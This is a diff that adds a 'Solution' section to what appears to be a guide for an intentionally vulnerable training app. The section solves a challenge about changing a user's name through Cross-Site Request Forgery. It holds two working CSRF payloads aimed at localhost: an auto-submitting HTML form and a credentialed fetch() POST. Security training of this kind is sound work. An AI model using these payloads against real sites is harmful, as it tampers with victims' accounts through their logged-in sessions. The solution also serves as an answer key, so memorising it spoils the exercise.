@@ -608,6 +608,34 @@ Change the name of a user by performing Cross-Site Request Forgery from another 
 `POST /profile`
 </details>
 
+<details>
+  <summary>📚 Solution</summary>
+
+<h3>Approach 1</h3>
+
+```javascript
+<form id="myForm" action="http://localhost:3000/profile" method="POST">
+  <input name="username" value="form-csrf"/>
+  <input type="submit"/>
+</form>
+
+<script>document.getElementById("myForm").submit();</script>
+```
+
+<h3>Approach 2</h3>
+
+```javascript
+fetch("http://localhost:3000/profile", {
+    method: 'POST',
+    credentials: 'include',
+    headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+    },
+    body: "username=fetch-csrf"
+  });
+```
+
+</details>
 
 ## Frontend Typosquatting
 
